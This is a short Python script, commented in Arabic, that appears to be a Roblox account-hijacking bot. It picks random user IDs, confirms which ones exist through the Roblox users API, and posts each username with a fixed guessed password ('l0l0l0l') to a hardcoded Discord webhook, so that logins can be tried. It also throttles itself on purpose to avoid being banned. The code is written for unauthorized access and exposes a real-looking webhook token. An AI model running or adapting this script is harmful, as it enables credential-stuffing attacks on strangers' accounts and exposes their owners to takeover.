import requests
import random
import time
import sys

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
FIXED_PASSWORD = "l0l0l0l"
WAIT_TIME = 30  # وقت الانتظار بالثواني
# -----------------------

def print_now(text):
    print(text)
    sys.stdout.flush()

def generate_id():
    """يولد ID يبدأ بـ 12 ويتبعه 6 أرقام عشوائية"""
    random_part = "".join([str(random.randint(0, 9)) for _ in range(6)])
    return int(f"12{random_part}")

def get_username_from_id(user_id):
    """يجلب اسم المستخدم من API روبلوكس"""
    url = f"https://users.roblox.com/v1/users/{user_id}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json().get("name")
        return None
    except:
        return None

def send_to_discord(username, password, user_id):
    """يرسل الحساب الشغال إلى ديسكورد"""
    payload = {
        "content": f"✅ **تم العثور على حساب محتمل!**\n**اسم المستخدم:** `{username}`\n**كلمة المرور:** `{password}`\n**ID الحساب:** `{user_id}`\n**رابط الملف الشخصي:** https://www.roblox.com/users/{user_id}/profile"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print_now(f"❗ خطأ في الإرسال لديسكورد: {e}")

def main():
    print_now(f"🚀 بدء البوت بنظام الانتظار ({WAIT_TIME} ثانية)...")
    print_now(f"كلمة المرور المستهدفة: {FIXED_PASSWORD}")
    
    while True:
        user_id = generate_id()
        username = get_username_from_id(user_id)
        
        if username:
            print_now(f"🔍 وجدنا حساب حقيقي: {username} (ID: {user_id})")
            
            # إرسال تنبيه لديسكورد بوجود الحساب لتجربته يدوياً أو عبر المتصفح
            send_to_discord(username, FIXED_PASSWORD, user_id)
            
            # الانتظار لمدة 30 ثانية قبل البحث عن الحساب التالي
            print_now(f"⏳ انتظار لمدة {WAIT_TIME} ثانية لتجنب الحظر...")
            time.sleep(WAIT_TIME)
        else:
            # إذا لم يجد مستخدم، ينتظر ثانية واحدة ويجرب ID آخر بسرعة
            time.sleep(1)

if __name__ == "__main__":
    main()
